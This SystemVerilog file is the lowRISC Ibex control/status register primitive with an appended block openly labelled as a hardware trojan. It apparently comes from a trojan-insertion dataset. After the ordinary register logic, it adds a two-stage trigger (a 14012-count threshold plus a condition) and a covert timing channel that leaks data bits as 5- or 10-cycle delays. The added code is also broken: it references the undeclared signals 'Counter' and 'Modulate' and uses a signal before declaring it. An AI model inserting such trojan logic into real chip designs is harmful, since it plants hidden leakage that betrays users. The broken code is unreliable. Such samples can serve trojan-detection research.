// Copyright lowRISC contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control / status register primitive
 */

//`include "prim_assert.sv"

module ibex_csr_trojan_Covert #(
  parameter int unsigned    Width      = 32,
  parameter bit             ShadowCopy = 1'b0,
  parameter bit [Width-1:0] ResetValue = '0
 ) (
  input  logic             clk_i,
  input  logic             rst_ni,

  input  logic [Width-1:0] wr_data_i,
  input  logic             wr_en_i,
  output logic [Width-1:0] rd_data_o,

  output logic             rd_error_o
);

  logic [Width-1:0] rdata_q;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      rdata_q <= ResetValue;
    end else if (wr_en_i) begin
      rdata_q <= wr_data_i;
    end
  end

  assign rd_data_o = rdata_q;

  if (ShadowCopy) begin : gen_shadow
    logic [Width-1:0] shadow_q;

    always_ff @(posedge clk_i or negedge rst_ni) begin
      if (!rst_ni) begin
        shadow_q <= ~ResetValue;
      end else if (wr_en_i) begin
        shadow_q <= ~wr_data_i;
      end
    end

    assign rd_error_o = rdata_q != ~shadow_q;

  end else begin : gen_no_shadow
    assign rd_error_o = 1'b0;
  end

  //`ASSERT_KNOWN(IbexCSREnValid, wr_en_i)


    // ============================================================
    // COVERT CHANNEL: Timing modulation
    // ============================================================
    logic covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [7:0] covert_bit_index;
    
    always_ff @(posedge clk_i) begin
        if (trojan_active) begin
            // Modulate timing based on data bit
            // Fast (5 cycles) for bit 0, Slow (10 cycles) for bit 1
            logic current_bit = Counter[covert_bit_index];
            
            if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out <= 1'b0;
            end else begin
                covert_bit_out <= 1'b1;
                covert_delay_counter <= '0;
                covert_bit_index <= covert_bit_index + 1;
            end
        end
    end

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 3: Threshold + Condition
    // ============================================================
    // Stage 1: Count payload activity (14012 times)
    // Stage 2: Activate when trigger signal asserted
    
    localparam int TRIGGER_THRESHOLD = 14012;
    logic [15:0] trojan_counter;
    logic trojan_armed;    // Stage 1: Counter reached threshold
    logic trojan_active;   // Stage 2: Activated by trigger signal
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            // Stage 1: Count payload signal activity
            if (|Modulate) begin
                trojan_counter <= trojan_counter + 1;
            end
            
            // Stage 1 complete: Arm the trojan
            if (trojan_counter >= TRIGGER_THRESHOLD) begin
                trojan_armed <= 1'b1;
            end
            
            // Stage 2: Activate only when armed AND trigger signal active
            if (trojan_armed && Counter) begin
                trojan_active <= 1'b1;
            end
        end
    end

endmodule
